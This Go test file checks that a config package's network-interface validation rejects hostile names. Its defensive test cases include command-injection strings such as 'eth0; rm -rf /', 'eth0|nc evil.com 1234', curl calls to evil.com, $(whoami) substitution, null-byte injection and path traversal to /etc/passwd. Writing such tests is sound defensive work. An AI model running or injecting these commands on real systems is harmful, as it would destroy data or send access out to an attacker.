package config

import (
	"strings"
	"testing"
)

func TestValidateInterfaceName(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		wantError bool
		errorMsg  string
	}{
		// Valid interface names
		{"valid basic interface", "eth0", false, ""},
		{"valid wireless interface", "wlan0", false, ""},
		{"valid interface with dash", "en0-1", false, ""},
		{"valid interface with underscore", "eth_0", false, ""},
		{"valid interface with dot", "eth0.100", false, ""},
		{"valid complex interface", "veth123_test-1.vlan", false, ""},

		// Invalid interface names - security risks
		{"empty string", "", true, "interface name cannot be empty"},
		{"command injection semicolon", "eth0; rm -rf /", true, "interface name contains invalid characters"},
		{"command injection ampersand", "eth0 && curl evil.com", true, "interface name contains invalid characters"},
		{"command injection pipe", "eth0|nc evil.com 1234", true, "interface name contains invalid characters"},
		{"command injection backtick", "eth0`whoami`", true, "interface name contains invalid characters"},
		{"command injection dollar", "eth0$(whoami)", true, "interface name contains invalid characters"},
		{"path traversal", "../../../etc/passwd", true, "interface name contains invalid characters"},
		{"forward slash", "eth0/test", true, "interface name contains invalid characters"},
		{"backslash", "eth0\\test", true, "interface name contains invalid characters"},
		{"parentheses", "eth0(test)", true, "interface name contains invalid characters"},
		{"braces", "eth0{test}", true, "interface name contains invalid characters"},
		{"brackets", "eth0[test]", true, "interface name contains invalid characters"},
		{"angle brackets", "eth0<test>", true, "interface name contains invalid characters"},
		{"quotes", "eth0\"test", true, "interface name contains invalid characters"},
		{"single quotes", "eth0'test", true, "interface name contains invalid characters"},
		{"space", "eth0 test", true, "interface name contains invalid characters"},
		{"tab", "eth0\ttest", true, "interface name contains invalid characters"},
		{"newline", "eth0\ntest", true, "interface name contains invalid characters"},
		{"carriage return", "eth0\rtest", true, "interface name contains invalid characters"},

		// Length validation
		{"too long", strings.Repeat("a", 256), true, "interface name too long: 256 characters"},

		// Invalid characters
		{"invalid character @", "eth0@test", true, "interface name contains invalid characters"},
		{"invalid character #", "eth0#test", true, "interface name contains invalid characters"},
		{"invalid character %", "eth0%test", true, "interface name contains invalid characters"},
		{"invalid character ^", "eth0^test", true, "interface name contains invalid characters"},
		{"invalid character *", "eth0*test", true, "interface name contains invalid characters"},
		{"invalid character +", "eth0+test", true, "interface name contains invalid characters"},
		{"invalid character =", "eth0=test", true, "interface name contains invalid characters"},
		{"invalid character ?", "eth0?test", true, "interface name contains invalid characters"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateInterfaceName(tt.input)
			if tt.wantError {
				if err == nil {
					t.Errorf("validateInterfaceName(%q) expected error but got nil", tt.input)
				} else if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("validateInterfaceName(%q) error = %v, expected to contain %q", tt.input, err, tt.errorMsg)
				}
			} else {
				if err != nil {
					t.Errorf("validateInterfaceName(%q) unexpected error = %v", tt.input, err)
				}
			}
		})
	}
}

func TestGetFirstInterface(t *testing.T) {
	tests := []struct {
		name          string
		interfaceSpec string
		expectedIface string
		expectedError bool
		errorContains string
	}{
		// Valid cases
		{"empty interface defaults to any", "", "any", false, ""},
		{"single valid interface", "eth0", "eth0", false, ""},
		{"special case any", "any", "any", false, ""},
		{"special case all", "all", "all", false, ""},
		{"comma separated interfaces", "eth0,wlan0,en0", "eth0", false, ""},
		{"comma separated with spaces", "eth0, wlan0, en0", "eth0", false, ""},
		{"first interface with trailing spaces", " eth0 ,wlan0", "eth0", false, ""},

		// Edge cases that should work
		{"empty first segment, valid second", ",eth0,wlan0", "eth0", false, ""},
		{"multiple empty segments before valid", ",,eth0,wlan0", "eth0", false, ""},
		{"whitespace only segments before valid", " , , eth0, wlan0", "eth0", false, ""},
		{"all empty segments default to any", ",,,", "any", false, ""},
		{"whitespace only segments default to any", " , , ", "any", false, ""},

		// Special values mixed with regular interfaces
		{"any first in comma list", "any,eth0", "any", false, ""},
		{"all first in comma list", "all,eth0", "all", false, ""},
		{"valid interface before any", "eth0,any", "eth0", false, ""},

		// Error cases - malicious interfaces
		{"command injection in first interface", "eth0; rm -rf /", "", true, "invalid interface 'eth0; rm -rf /'"},
		{"command injection in second interface", "eth0,wlan0; rm -rf /", "eth0", false, ""}, // Should succeed with first valid interface
		{"all interfaces malicious", "eth0; rm -rf /,wlan0; curl evil.com", "", true, "invalid interface 'eth0; rm -rf /'"},
		{"path traversal", "../../../etc/passwd", "", true, "invalid interface '../../../etc/passwd'"},
		{"invalid characters", "eth0@test", "", true, "invalid interface 'eth0@test'"},
		{"too long interface", strings.Repeat("a", 256), "", true, "invalid interface"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{}
			cfg.Capture.Interface = tt.interfaceSpec

			iface, err := cfg.GetFirstInterface()

			if tt.expectedError {
				if err == nil {
					t.Errorf("GetFirstInterface(%q) expected error but got nil, result: %s", tt.interfaceSpec, iface)
				} else if tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
					t.Errorf("GetFirstInterface(%q) error = %v, expected to contain %q", tt.interfaceSpec, err, tt.errorContains)
				}
			} else {
				if err != nil {
					t.Errorf("GetFirstInterface(%q) unexpected error = %v", tt.interfaceSpec, err)
				}
				if iface != tt.expectedIface {
					t.Errorf("GetFirstInterface(%q) = %q, expected %q", tt.interfaceSpec, iface, tt.expectedIface)
				}
			}
		})
	}
}

func TestGetFirstInterface_SecurityFocused(t *testing.T) {
	// These are specific security-focused test cases that verify
	// the most dangerous command injection scenarios are blocked
	maliciousInputs := []struct {
		name  string
		input string
	}{
		{"shell command execution", "eth0; rm -rf /"},
		{"background process", "eth0 && curl evil.com &"},
		{"pipe to dangerous command", "eth0|nc evil.com 1234"},
		{"backtick command substitution", "eth0`whoami`"},
		{"dollar command substitution", "eth0$(whoami)"},
		{"newline injection", "eth0\nwhoami"},
		{"path traversal to system files", "../../../etc/passwd"},
		{"null byte injection", "eth0\x00; rm -rf /"},
		{"unicode control characters", "eth0\u0000\u001f"},
	}

	for _, tt := range maliciousInputs {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{}
			cfg.Capture.Interface = tt.input

			iface, err := cfg.GetFirstInterface()
			if err == nil {
				t.Errorf("Security test failed: GetFirstInterface(%q) should reject malicious input but returned: %s", tt.input, iface)
			}

			// The main security check is that the input was rejected
			// Error messages may contain the input for debugging purposes, which is acceptable
			// as long as the dangerous input never reaches command execution
		})
	}
}

func TestGetAllInterfaces(t *testing.T) {
	tests := []struct {
		name               string
		interfaceSpec      string
		expectedInterfaces []string
		expectedError      bool
		errorContains      string
	}{
		// Valid cases
		{"empty interface defaults to any", "", []string{"any"}, false, ""},
		{"single valid interface", "eth0", []string{"eth0"}, false, ""},
		{"special case any", "any", []string{"any"}, false, ""},
		{"special case all", "all", []string{"all"}, false, ""},
		{"two interfaces", "eth0,wlan0", []string{"eth0", "wlan0"}, false, ""},
		{"three interfaces with spaces", "eth0, wlan0, en0", []string{"eth0", "wlan0", "en0"}, false, ""},
		{"mixed special and regular", "any,eth0", []string{"any", "eth0"}, false, ""},

		// Edge cases that should work
		{"skip empty segments", "eth0,,wlan0", []string{"eth0", "wlan0"}, false, ""},
		{"whitespace handling", " eth0 , wlan0 ", []string{"eth0", "wlan0"}, false, ""},
		{"all empty segments default to any", ",,,", []string{"any"}, false, ""},

		// Error cases
		{"malicious interface first", "eth0; rm -rf /", nil, true, "invalid interface 'eth0; rm -rf /'"},
		{"malicious interface second", "eth0,wlan0; curl evil.com", nil, true, "invalid interface 'wlan0; curl evil.com'"},
		{"all interfaces malicious", "eth0; rm -rf /,wlan0; curl evil.com", nil, true, "invalid interface"},
		{"path traversal", "../../../etc/passwd", nil, true, "invalid interface"},
		{"invalid characters", "eth0@test", nil, true, "invalid interface"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{}
			cfg.Capture.Interface = tt.interfaceSpec

			interfaces, err := cfg.GetAllInterfaces()

			if tt.expectedError {
				if err == nil {
					t.Errorf("GetAllInterfaces(%q) expected error but got nil, result: %v", tt.interfaceSpec, interfaces)
				} else if tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
					t.Errorf("GetAllInterfaces(%q) error = %v, expected to contain %q", tt.interfaceSpec, err, tt.errorContains)
				}
			} else {
				if err != nil {
					t.Errorf("GetAllInterfaces(%q) unexpected error = %v", tt.interfaceSpec, err)
				}
				if len(interfaces) != len(tt.expectedInterfaces) {
					t.Errorf("GetAllInterfaces(%q) = %v, expected %v (length mismatch)", tt.interfaceSpec, interfaces, tt.expectedInterfaces)
				} else {
					for i, expectedIface := range tt.expectedInterfaces {
						if interfaces[i] != expectedIface {
							t.Errorf("GetAllInterfaces(%q)[%d] = %q, expected %q", tt.interfaceSpec, i, interfaces[i], expectedIface)
						}
					}
				}
			}
		})
	}
}

func TestConfig_ValidateAndSetDefaults(t *testing.T) {
	cfg := &Config{}
	cfg.ValidateAndSetDefaults()

	// Test that defaults are set correctly
	if cfg.Capture.Interface != "any" {
		t.Errorf("Expected default interface to be 'any', got %q", cfg.Capture.Interface)
	}

	if cfg.Logging.Level != "info" {
		t.Errorf("Expected default log level to be 'info', got %q", cfg.Logging.Level)
	}
}
